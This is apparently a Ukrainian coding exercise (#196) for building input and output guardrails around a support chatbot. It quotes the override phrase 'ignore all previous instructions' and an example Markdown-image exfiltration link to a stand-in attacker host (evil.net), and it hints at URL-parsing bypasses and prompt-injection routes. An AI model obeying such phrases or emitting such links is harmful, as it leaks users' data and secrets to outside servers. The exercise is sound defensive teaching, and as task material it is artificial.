# №196 · Guardrails-пайплайн 🟡

**Ситуація.** Чат-бот підтримки отримує від користувачів усе: номери карток, email'и, «ignore all previous instructions», величезні вставки. А модель у відповідь може вивести ключ API з контексту або намалювати `![x](https://evil.net/?d=...)`: клієнт сам завантажить картинку, і дані підуть на чужий сервер без жодного кліку. Це класична ексфільтрація через Markdown (CWE-200, див. також OWASP LLM Top 10: LLM02 і LLM05). Модель не є межею безпеки, тому перед нею й після неї стоїть звичайний код: ланцюжок rails.

**Що зробити** у `solution.py` (точні правила, порядок rails і формат журналу в докстрингу):
- `GuardrailPipeline.check_input`: розмір, PII (email, картки за Луном), класифікатор jailbreak як функція-параметр; рішення allow/redact/block;
- `GuardrailPipeline.check_output`: секрети, Markdown/HTML-зображення, URL поза allowlist доменів;
- fail closed: помилка чи сміття від класифікатора це block; журнал спрацювань без жодного тексту користувача.

**Підказки (без розв'язку):**
- порядок rails це частина контракту: що саме має побачити класифікатор (він зовнішній сервіс) і що буде, якщо перевірку розміру поставити після нього?
- перевірка домену: чому `endswith("example.com")` і пошук підрядка в URL хибні? Подивись, що `urllib.parse` називає `hostname` і чим він відрізняється від `netloc`;
- у браузерах `\` у URL поводиться як `/`: що це означає для парсера на сервері?
- зображення бувають не лише `![](...)`: які ще форми Markdown і HTML завантажують ресурс автоматично?
- номер із 16 цифр ще не картка: як відрізнити номер замовлення від картки й не псувати чесні запити (false positives теж баг)?

**Подумай:**
- де в production стоять такі rails (API gateway, бібліотека на кшталт NeMo Guardrails, Llama Guard/Prompt Guard як класифікатор) і чому вони не заміна авторизації інструментів (завдання №137)?
- що робить клієнт чат-застосунку, коли відповідь заблокована, і як не дати зловмиснику використати відмови як оракул?
- яку частку false positives ви готові терпіти для input rails, а яку для output (коли блок ламає UX)?
- яких атак цей шар не бачить: багатокроковий jailbreak, Unicode-обфускація, ін'єкція через дані RAG (№198, №197 про межі потоку даних)?
